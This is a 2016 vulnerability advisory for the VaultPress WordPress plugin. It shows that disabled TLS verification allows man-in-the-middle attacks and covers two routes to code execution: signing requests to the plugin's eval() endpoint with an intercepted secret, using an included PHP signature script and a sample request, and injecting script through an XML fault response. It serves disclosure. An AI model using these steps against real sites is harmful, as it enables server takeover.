VaultPress - Remote Code Execution via Man in The Middle attack
------------------------------------------------------------------------
David Vaartjes, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Man in The Middle (MiTM) vulnerability has been identified in the
VaultPress plugin of WordPress. This issue allows an attacker to to
sniff clear-text communication and to run arbitrary PHP code on the
affected WordPress host.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160728-0002

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on VaultPress WordPress Plugin
version 1.8.4

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------




[..]
if ( class_exists( &#039;WP_Http&#039; ) ) {
$args = array(
&#039;method&#039; => &#039;POST&#039;,
&#039;body&#039; => $xml,
&#039;headers&#039; => $this->headers,
--> &#039;sslverify&#039; => false,
);
if ( $this->timeout )
[..]

Once being possisioned as a MiTM, we&#039;ve analysed if we could exploit this to also run arbitrary code on the WP server running the VaultPress plugin. Multiple possibilities exist.
Attack vector #1 - targeting vulnerable instance during registration using PHP&#039;s eval() function

If the MiTM attack is executed during registration (small change since this happens only once) the secret returned by the VaultPress server can be intercepted. Once obtained, the key can be used to communicatie with the WordPress host&#039;s VaultPress API, which offers a friendly method to run any PHP code you send to it directly using eval().


[..]
switch ( $_GET[&#039;action&#039;] ) {
default:
die();
break;
--> case &#039;exec&#039;:
--> $code = $_POST[&#039;code&#039;];
if ( !$code )
$this->response( "No Code Found" );
--> $syntax_check = @eval( &#039;return true;&#039; . $code );
if ( !$syntax_check )
$this->response( "Code Failed Syntax Check" );
$this->response( eval( $code . &#039;;&#039; ) );
die();
break;
[..]

The above code can be triggered using the following request:

Host: <target>
Connection: close
Content-Length: 67
Content-Type: application/x-www-form-urlencoded

code=phpinfo();&signature=5f3db7516912e6b30422a17c1d0bf49beedd6de8:

Please note that a valid signature is required. To create it, the secret value is needed, which seems to be exchanged during registration only. So again, this seems only to affects installations that were targeted by a MiTM during registration. I didn&#039;t checked this out, but it might be possible that the secret is included in the backup, such that it can be stolen at backup time as well by a MiTM.

The following script can be used to create the signature:

<?php
/**
**/

$secret = "MITMD SECRET HERE";
$sig = ":";
$post = Array
(
&#039;code&#039; => "phpinfo();",
);

ksort( $post );
$sig = explode( &#039;:&#039;, $sig );
$to_sign = serialize( array( &#039;uri&#039; => $uri, &#039;post&#039; => $post ) );
$signature = hash_hmac( &#039;sha1&#039;, "$to_sign:", $secret );

echo "Signature :". $signature;
?>


Attack vector #2 - targeting vulnerable instance after registration using script injection


Responses from the server lack any encoding when shown in the plugin&#039;s dashboard HTML pages. This allows a MiTM to inject scripting code in the target user&#039;s WordPress Admin panel. Effectively, in WordPress, this is game-over since XSS in the Admin Panel can be used to run arbitrary PHP code as well.


<div id="vp-notice" class="vp-notice vp-<?php echo $type; ?> wrap clearfix">
<div class="vp-message">
--> <h3><?php echo $heading; ?></h3>
--> <p><?php echo $message; ?></p>
</div>
</div>

To exploit this the following XML (faultcode) can be returned using an XML API call via a MiTM attack. Note the scripting code in the faultString field.


<?xml version="1.0"?>
<methodResponse>
<fault>
<value>
<struct>
<member>
<name>faultCode</name>
<value><int>-5</int></value>
</member>
<member>
<name>faultString</name>
--> <value><string><![CDATA[<script>alert("XSS");</script>]]></string></value>
</member>
</struct>
</value>
</fault>
</methodResponse>


------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.

